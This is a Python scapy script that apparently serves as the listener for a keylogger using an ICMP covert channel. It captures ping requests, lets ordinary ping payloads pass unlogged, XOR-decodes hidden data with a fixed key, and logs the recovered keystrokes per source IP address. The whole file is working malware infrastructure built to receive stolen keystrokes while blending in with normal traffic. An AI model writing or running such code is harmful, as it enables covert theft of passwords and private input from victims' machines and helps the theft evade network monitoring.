from scapy.all import sniff, ICMP, Raw, IP
from struct import unpack
from client import Client

XOR_CONSTANT = 131

client_map = {}


def packet_handler(packet):
    payload = packet[Raw].load

    # filter out legitmate traffic
    if(payload.startswith(b'abcdefgh')):
        return

    # fmt looks for a big endian blob of integers
    fmt = f">{int(len(payload)/4)}I"

    src_ip = packet[IP].src

    # add the source IP if needed
    if(client_map.get(src_ip) == None):
        client_map[src_ip] = Client(src_ip)

    # get the raw bytes
    raw_bytes = list(unpack(fmt, payload))
    # decrypt
    for i in range(0, len(raw_bytes)):
        raw_bytes[i] = ((raw_bytes[i] & 0xff000000) >> 24) ^ XOR_CONSTANT
    # log
    c = client_map.get(src_ip)
    c.log_keys(raw_bytes)

def main():
    print("Started ICMP listener")
    sniff(filter="icmp and icmp[icmptype] = 8", prn=packet_handler, store=False)

if __name__ == '__main__':
    main()
    
